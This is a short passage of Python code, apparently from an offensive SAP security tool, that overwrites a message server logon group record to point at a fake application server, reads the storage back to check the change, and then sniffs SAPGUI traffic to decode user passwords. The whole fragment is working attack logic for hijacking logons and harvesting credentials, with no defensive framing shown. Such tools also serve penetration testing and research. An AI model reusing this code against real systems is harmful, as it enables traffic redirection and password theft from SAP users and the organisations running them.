    p.adm_records[0].rzl_strg_value = build_logon_group(fake_as['ip'], fake_as['diag_port'], kernel)
    r = s.sr(p)

    # Again showing the storage with hopefuly our updated values
    r = s.sr(p_adm_readall_ofs)
    records_ofs = parse_adm_readall_ofs(r)

    # now waiting for any SAPGUI traffic that should be routed to us
    # and decoding passwords
    logger.info("[+] Now password sniffing...")
    sniff(iface=attacked_as["iface"], prn=diag_grab_password, \
          filter="host %s and port %s" % (attacked_as['ip'], as_port),
          timeout=60)
    
